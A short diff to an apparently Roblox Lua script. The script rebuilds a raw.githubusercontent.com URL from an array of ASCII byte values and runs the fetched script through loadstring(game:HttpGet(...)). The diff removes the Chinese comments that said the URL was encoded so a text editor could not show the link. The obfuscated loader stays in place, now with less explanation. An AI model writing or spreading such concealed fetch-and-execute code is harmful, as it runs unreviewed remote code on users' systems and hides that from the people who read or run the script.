@@ -26,8 +26,7 @@ game:GetService("StarterGui"):SetCore("SendNotification",{
     Duration = 3
 })
 
--- ==================== 遠端網址加密區塊 ====================
--- 原網址已被轉換為 ASCII 數字編碼陣列，文字編輯器完全看不出連結
+
 local encrypted_url_bytes = {
     104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 
     101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 114, 121, 97, 110, 114, 121, 
@@ -36,13 +35,12 @@ local encrypted_url_bytes = {
     110, 101, 116, 37, 50, 48, 80, 114, 101, 115, 115, 46, 108, 117, 97
 }
 
--- 動態還原網址字串
 local decrypted_url = ""
 for _, byte in ipairs(encrypted_url_bytes) do
     decrypted_url = decrypted_url .. string.char(byte)
 end
 
--- 安全載入並執行主要腳本
+
 local success, err = pcall(function()
     loadstring(game:HttpGet(decrypted_url))()
 end)
